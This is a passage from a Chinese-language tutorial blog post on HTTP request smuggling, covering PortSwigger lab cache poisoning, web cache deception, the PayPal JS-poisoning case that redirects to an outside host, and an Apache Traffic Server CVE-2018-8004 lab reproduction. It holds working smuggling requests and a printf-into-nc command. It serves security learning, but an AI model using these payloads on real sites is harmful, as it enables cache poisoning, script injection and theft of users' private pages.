rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=f6c7ZBB52a6iedorGSywc8jM6USu4685</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 178</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac701fe61fabd97b8027465701f800a8.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure><p>&#x7136;&#x540E;&#x8BBF;&#x95EE;<code>/resources/js/tracking.js</code>:</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129015245.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x54CD;&#x5E94;&#x5305;&#x7684;&#x8DF3;&#x8F6C;&#x5730;&#x5740;&#x88AB;&#x6211;&#x4EEC;&#x4FEE;&#x6539;&#x6210;&#x4E86;&#x6211;&#x4EEC; exploit &#x7684;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x8BBF;&#x95EE;&#x6B63;&#x5E38;&#x670D;&#x52A1;&#x5668;&#x4E3B;&#x9875;&#x8BD5;&#x8BD5;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129015530.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6210;&#x529F;<code>alert(1)</code>&#x3002;</p><p>&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4EE5;&#x4E0B;&#x6D41;&#x7A0B;&#x6765;&#x7406;&#x89E3;&#xFF1A;</p><figure class="highlight gherkin hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Innocent        Attacker          Front           Backend</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string"> * ending B *</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">            [*CP*]&lt;--B(200)----</span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">&lt;--B(200)------</span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">--C---------------------------&gt;</span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">&lt;--B(200)--------------------[HIT]             </span>|</span><br></pre></td></tr></table></figure><ul><li>1A + 1/2B means request A + an incomplete query B</li><li>A(X) : means X query is hidden in body of query A</li><li>CP : Cache poisoning</li></ul><p>&#x4E0E;&#x4E4B;&#x524D;&#x90A3;&#x4E2A;&#x6D41;&#x7A0B;&#x56FE;&#x7C7B;&#x4F3C;&#xFF0C;&#x56E0;&#x4E3A;&#x5728; C &#x8BF7;&#x6C42;&#x7684;<code>/resources/js/tracking.js</code>&#x4F1A;&#x88AB; Front &#x8BA4;&#x4E3A;&#x662F;&#x9759;&#x6001;&#x8D44;&#x6E90;&#x7F13;&#x5B58;&#x8D77;&#x6765;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x5229;&#x7528; HTTP Smuggling &#x5C06;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x5BFC;&#x5411;&#x4E86;&#x6211;&#x4EEC;&#x7684; exploit &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD4;&#x56DE;&#x4E86;<code>alert(1)</code>&#x7ED9; C &#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x4E2A;&#x54CD;&#x5E94;&#x5305;&#x5C31;&#x4F1A;&#x88AB; Front &#x670D;&#x52A1;&#x5668;&#x7F13;&#x5B58;&#x8D77;&#x6765;&#xFF0C;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x5C31;&#x6210;&#x529F;&#x8FDB;&#x884C;&#x4E86;&#x6295;&#x6BD2;&#x3002;</p><h3 id="Perform-Web-Cache-Deception"><a href="#Perform-Web-Cache-Deception" class="headerlink" title="Perform Web Cache Deception"></a>Perform Web Cache Deception</h3><p>&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x573A;&#x666F;&#x4E0E;&#x7F13;&#x5B58;&#x6295;&#x6BD2;&#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;&#x7A0D;&#x6709;&#x4E00;&#x70B9;&#x533A;&#x522B;&#xFF0C;&#x6309;&#x7167;&#x6BD4;&#x8F83;&#x5B98;&#x65B9;&#x7684;&#x8BF4;&#x6CD5;&#xFF0C;&#x7F13;&#x5B58;&#x6B3A;&#x9A97;&#x4E0E;&#x7F13;&#x5B58;&#x6295;&#x6BD2;&#x6709;&#x4EE5;&#x4E0B;&#x8FD9;&#x4E9B;&#x533A;&#x522B;&#xFF1A;</p><blockquote><p>&#x200B;    What is the difference between web cache poisoning and web cache deception?</p><ul><li>In <strong>web cache poisoning</strong>, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.</li><li>In <strong>web cache deception</strong>, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.</li></ul></blockquote><p>&#x5728; Web &#x7F13;&#x5B58;&#x6295;&#x6BD2;&#x4E2D;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x4F7F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5C06;&#x67D0;&#x4E9B;&#x6076;&#x610F;&#x5185;&#x5BB9;&#x5B58;&#x50A8;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x5E76;&#x5C06;&#x8BE5;&#x5185;&#x5BB9;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x63D0;&#x4F9B;&#x7ED9;&#x5176;&#x4ED6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7528;&#x6237;&#x3002;<br>&#x5728;Web&#x7F13;&#x5B58;&#x6B3A;&#x9A97;&#x4E2D;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x4F7F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5C06;&#x4E00;&#x4E9B;&#x5C5E;&#x4E8E;&#x53E6;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x654F;&#x611F;&#x5185;&#x5BB9;&#x5B58;&#x50A8;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x653B;&#x51FB;&#x8005;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x68C0;&#x7D22;&#x8BE5;&#x5185;&#x5BB9;&#x3002;</p><p>&#x8FD9;&#x4E2A;&#x6211;&#x4EEC;&#x5C31;&#x4E0D;&#x914D;&#x5408; <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to perform web cache deception</a> &#x6765;&#x505A;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A; LAB &#x63D0;&#x4F9B;&#x7684;&#x73AF;&#x5883; victim &#x6709;&#x70B9;&#x95EE;&#x9898;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x7406;&#x89E3;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x5982;&#x4E0B; HTTP &#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 43</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /private/messages HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Foo</span>: X</span><br></pre></td></tr></table></figure><p>&#x8BE5; Smugle &#x7684;&#x8BF7;&#x6C42;&#x4F1A;&#x7528;<code>Foo: X</code>&#x5403;&#x6389;&#x4E0B;&#x4E00;&#x4E2A;&#x53D1;&#x8FC7;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#x7684;&#x7B2C;&#x4E00;&#x884C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>GET /xxx HTTP/1.1</code>&#x90A3;&#x4E00;&#x884C;&#xFF0C;&#x5E76;&#x4E14;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x8FD8;&#x4F1A;&#x5E26;&#x7740;&#x7528;&#x6237;&#x7684; Cookie &#x53BB;&#x8BBF;&#x95EE;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;&#x4E00;&#x4E2A;CSRF&#xFF0C;&#x8BE5;&#x8BF7;&#x6C42;&#x53D8;&#x6210;&#x4E86;&#x4EE5;&#x4E0B;&#x8BF7;&#x6C42;&#x5934;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/private/messages</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Foo</span>: XGET /static/some-image.png HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br></pre></td></tr></table></figure><p>&#x53EA;&#x8981;&#x6211;&#x4EEC;&#x591A;&#x53D1;&#x9001;&#x51E0;&#x6B21;&#xFF0C;&#x4E00;&#x65E6;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x7684;&#x662F;&#x9759;&#x6001;&#x8D44;&#x6E90;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x4F1A;&#x88AB; Front &#x670D;&#x52A1;&#x5668;&#x7F13;&#x5B58;&#x8D77;&#x6765;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x62FF;&#x5230;&#x7528;&#x6237;<code>/private/messages</code>&#x7684;&#x4FE1;&#x606F;&#x4E86;&#x3002;&#x8FD9;&#x91CC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5927;&#x91CF;&#x7684;&#x91CD;&#x590D;&#x53D1;&#x5305;&#xFF0C;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x6784;&#x9020;&#x8BA9;&#x9759;&#x6001;&#x8D44;&#x6E90;&#x7F13;&#x5B58;&#xFF0C;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x4E00;&#x5B9A;&#x8FD0;&#x6C14;&#x7684;&#x3002;</p><p>&#x81F3;&#x6B64;&#xFF0C;HTTP Smuggling &#x7684;&#x57FA;&#x672C;&#x653B;&#x51FB;&#x9762;&#x90FD;&#x5DF2;&#x7ECF;&#x4ECB;&#x7ECD;&#x5B8C;&#x6BD5;&#x4E86;&#x3002;</p><h1 id="Real-World"><a href="#Real-World" class="headerlink" title="Real World"></a>Real World</h1><h2 id="Paypal"><a href="#Paypal" class="headerlink" title="Paypal"></a>Paypal</h2><p>&#x9996;&#x5148;&#x80AF;&#x5B9A;&#x5F97;&#x6765;&#x804A;&#x804A;&#x4ECA;&#x5E74;&#x5206;&#x4EAB; HTTP Smuggling &#x7684;&#x4F5C;&#x8005;&#x5728; Black Hat &#x4E0A;&#x5206;&#x4EAB;&#x7684; Paypal &#x6F0F;&#x6D1E;&#x5B9E;&#x4F8B;&#x4E86;</p><p>&#x4F5C;&#x8005;&#x9996;&#x5148;&#x901A;&#x8FC7; HTTP Smuggling &#x7684;&#x65B9;&#x5F0F;&#x5C06;&#x4E00;&#x4E2A;&#x7528;&#x4E8E; Paypal &#x767B;&#x5F55;&#x7684; js &#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4E86;&#x6295;&#x6BD2;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span><br><span class="line"><span class="hljs-attribute">Host</span>: c.paypal.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 61 </span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /webstatic HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: skeletonscribe.net?</span><br><span class="line"><span class="hljs-attribute">X</span>: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span><br><span class="line"><span class="hljs-attribute">Host</span>: c.paypal.com</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="hljs-number">302</span> Found</span><br><span class="line"><span class="hljs-attribute">Location</span>: http://skeletonscribe.net?, c.paypal.com/webstatic/</span><br></pre></td></tr></table></figure><p>&#x4F46;&#x662F; Paypal &#x767B;&#x5F55;&#x9875;&#x9762;&#x6709; CSP &#x89C4;&#x5219; <code>script-src</code> &#x9650;&#x5236;&#x4E86;&#x8FD9;&#x4E2A;&#x8DF3;&#x8F6C;&#x3002;</p><p><img src="https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg" alt></p><p>&#x540E;&#x6765;&#x4F5C;&#x8005;&#x53D1;&#x73B0;&#x8BE5;&#x9875;&#x9762;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x52A8;&#x6001;&#x751F;&#x6210;&#x7684; iframe &#x5F15;&#x5165;&#x4E86; c.paypal.com &#xFF0C;&#x4E14;&#x8BE5;&#x5B50;&#x9875;&#x9762;&#x6CA1;&#x6709; CSP &#x800C;&#x4E14;&#x8FD8;&#x5F15;&#x5165;&#x4E86;&#x4F5C;&#x8005;&#x6295;&#x6BD2;&#x7684; js &#x6587;&#x4EF6;&#xFF01;&#x867D;&#x7136;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x63A7;&#x5236; iframe &#x9875;&#x9762;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x540C;&#x6E90;&#x7B56;&#x7565;&#xFF0C;&#x662F;&#x8BFB;&#x4E0D;&#x5230;&#x7236;&#x9875;&#x9762;&#x7684;&#x6570;&#x636E;&#x7684;&#x3002;</p><p><img src="https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg" alt></p><p>&#x518D;&#x63A5;&#x7740;&#x4F5C;&#x8005;&#x7684;&#x540C;&#x4E8B;&#x5728; paypal.com/us/gifts &#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x4E0D;&#x4F7F;&#x7528; CSP &#x7684;&#x9875;&#x9762;&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x5BFC;&#x5165;&#x4E86;&#x4F5C;&#x8005;&#x6295;&#x6BD2;&#x7684; js &#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x6837;&#x4F5C;&#x8005;&#x7EC8;&#x4E8E;&#x901A;&#x8FC7; js &#x5C06; c.paypal.com &#x7684; iframe &#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E86; paypal.com/us/gifts &#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x540C;&#x6E90;&#x4E86;&#xFF0C;&#x4E5F;&#x5C31;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x7236;&#x9875;&#x9762;&#x7684;&#x6570;&#x636E;&#x4E86;&#x3002;</p><p><img src="https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg" alt></p><p>Paypal &#x7B2C;&#x4E00;&#x6B21;&#x4FEE;&#x590D;&#x662F;&#x5C06; Akamai &#x914D;&#x7F6E;&#x4FEE;&#x6539;&#x6210;&#x62D2;&#x7EDD;&#x542B;&#x6709; Transfer-Encoding: chunked &#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x4F46;&#x662F;&#x540E;&#x6765;&#x53C8;&#x88AB;&#x4F5C;&#x8005;&#x6784;&#x9020;&#x4E86;&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7684; header &#x7ED5;&#x8FC7;&#x4E86;&#xFF1A;</p><figure class="highlight fortran hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Transfer</span>-Encoding:</span><br><span class="line"> chunked</span><br></pre></td></tr></table></figure><h2 id="ATS"><a href="#ATS" class="headerlink" title="ATS"></a>ATS</h2><blockquote><p>&#x200B;    Apache Traffic Server&#xFF08;ATS&#xFF09;&#x662F;&#x7F8E;&#x56FD;&#x963F;&#x5E15;&#x5947;&#xFF08;Apache&#xFF09;&#x8F6F;&#x4EF6;&#x57FA;&#x91D1;&#x4F1A;&#x7684;&#x4E00;&#x6B3E;&#x9AD8;&#x6548;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x7684;HTTP&#x4EE3;&#x7406;&#x548C;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x3002;</p><p>Apache ATS 6.0.0&#x7248;&#x672C;&#x81F3;6.2.2&#x7248;&#x672C;&#x548C;7.0.0&#x7248;&#x672C;&#x81F3;7.1.3&#x7248;&#x672C;&#x4E2D;&#x5B58;&#x5728;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x3002;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x5229;&#x7528;&#x8BE5;&#x6F0F;&#x6D1E;&#x5B9E;&#x65BD;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x653B;&#x51FB;&#x6216;&#x9020;&#x6210;&#x7F13;&#x5B58;&#x4E2D;&#x6BD2;&#x3002;</p><p>&#x5728;&#x7F8E;&#x56FD;&#x56FD;&#x5BB6;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x5E93;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x5173;&#x4E8E;&#x8BE5;&#x6F0F;&#x6D1E;&#x7684;&#x56DB;&#x4E2A;&#x8865;&#x4E01;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x8BE6;&#x7EC6;&#x770B;&#x4E00;&#x4E0B;&#x3002;</p><p>CVE-2018-8004 &#x8865;&#x4E01;&#x5217;&#x8868;</p><ul><li><a href="https://github.com/apache/trafficserver/pull/3192" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3192</a></li><li><a href="https://github.com/apache/trafficserver/pull/3201" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3201</a></li><li><a href="https://github.com/apache/trafficserver/pull/3231" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3231</a></li><li><a href="https://github.com/apache/trafficserver/pull/3251" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3251</a></li></ul><p>&#x6CE8;&#xFF1A;&#x867D;&#x7136;&#x6F0F;&#x6D1E;&#x901A;&#x544A;&#x4E2D;&#x63CF;&#x8FF0;&#x8BE5;&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5230;7.1.3&#x7248;&#x672C;&#xFF0C;&#x4F46;&#x4ECE;github&#x4E0A;&#x8865;&#x4E01;&#x5F52;&#x6863;&#x7684;&#x7248;&#x672C;&#x4E2D;&#x770B;&#xFF0C;&#x5728;7.1.3&#x7248;&#x672C;&#x4E2D;&#x5DF2;&#x7ECF;&#x4FEE;&#x590D;&#x4E86;&#x5927;&#x90E8;&#x5206;&#x7684;&#x6F0F;&#x6D1E;&#x3002;</p></blockquote><p>&#x5173;&#x4E8E;&#x8FD9;&#x56DB;&#x4E2A;&#x8865;&#x4E01;&#x7684;&#x5206;&#x6790;&#x4E0E;&#x590D;&#x73B0;&#x6211;&#x89C9;&#x5F97; @mengchen &#x5E08;&#x5085;&#x5DF2;&#x7ECF;&#x5199;&#x7684;&#x975E;&#x5E38;&#x8BE6;&#x7EC6;&#x4E86;&#xFF0C;&#x6211;&#x5C31;&#x4E0D;&#x5728;&#x8D58;&#x8FF0;&#x4E86;&#xFF0C;&#x5EFA;&#x8BAE;&#x770B;&#x539F;&#x6587;&#x90E8;&#x5206; <a href="https://paper.seebug.org/1048/#4-httpcve-2018-8004" target="_blank" rel="noopener">HTTP&#x8D70;&#x79C1;&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#x2014;&#x2014;CVE-2018-8004</a></p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x8BF4;&#x4E00;&#x4E0B;&#x539F;&#x6587;&#x6CA1;&#x6709;&#x7684;&#x90E8;&#x5206;&#xFF1A;</p><figure class="highlight gherkin hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[dummy-host7.example.com]</span><br><span class="line">                          |</span><br><span class="line"><span class="hljs-string">                    +-[8080]-----+</span></span><br><span class="line"><span class="hljs-string">                    </span>|<span class="hljs-string"> 8007-&gt;8080 </span>|</span><br><span class="line">                    |<span class="hljs-string">  ATS7      </span>|</span><br><span class="line">                    |<span class="hljs-string">            </span>|</span><br><span class="line">                    +-----+------+</span><br><span class="line">                          |</span><br><span class="line"><span class="hljs-string">                          </span>|</span><br><span class="line">                    +--[80]----+</span><br><span class="line">                    |<span class="hljs-string"> 8002-&gt;80 </span>|</span><br><span class="line">                    |<span class="hljs-string">  Nginx   </span>|</span><br><span class="line">                    |<span class="hljs-string">          </span>|</span><br><span class="line">                    +----------+</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x6784;&#x5EFA;&#x4EE5;&#x4E0A;&#x573A;&#x666F;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6211;&#x642D;&#x5EFA;&#x7684; docker &#x5B9E;&#x9A8C;&#x73AF;&#x5883; <a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/lab1" target="_blank" rel="noopener">lab1</a></p><h3 id="Request-Splitting-using-Huge-Header"><a href="#Request-Splitting-using-Huge-Header" class="headerlink" title="Request Splitting using Huge Header"></a>Request Splitting using Huge Header</h3><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528; 65535 &#x4E2A;&#x5B57;&#x7B26;&#x7684; header &#x6765;&#x8FDB;&#x884C;&#x5B9E;&#x9A8C;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x6765;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x542B;&#x6709; 65535 &#x4E2A;&#x5B57;&#x7B26;&#x7684; header &#x7684;&#x8BF7;&#x6C42;&#x5230; ATS 7:</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET_/something.html?zorg2=5_HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:_dummy-host7.example.com\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;X:_&quot;%65534s&quot;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">|tr <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&quot;1&quot;</span>\</span><br><span class="line">|tr <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-string">&quot; &quot;</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8007</span><br></pre></td></tr></table></figure><p>nginx &#x7684;&#x8FD4;&#x56DE;&#x4F1A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE; 400 &#x9519;&#x8BEF;&#xFF0C;&#x4F46;&#x662F;&#x6709; ATS 7 &#x5C31;&#x6BD4;&#x8F83;&#x6709;&#x8DA3;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x5F97;&#x5230;&#x4E00;&#x4E2A; 400 &#x54CD;&#x5E94;&#x4EE5;&#x53CA; ATS 7 &#x7684; 200 &#x54CD;&#x5E94;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">400</span> Invalid HTTP Request</span><br><span class="line"><span class="hljs-attribute">Date</span>: Fri, 29 Nov 2019 18:52:42 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="hljs-attribute">Server</span>: ATS/7.1.1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: no-store</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="hljs-attribute">Content-Language</span>: en</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 220</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;TITLE&gt;Bad Request&lt;/TITLE&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY 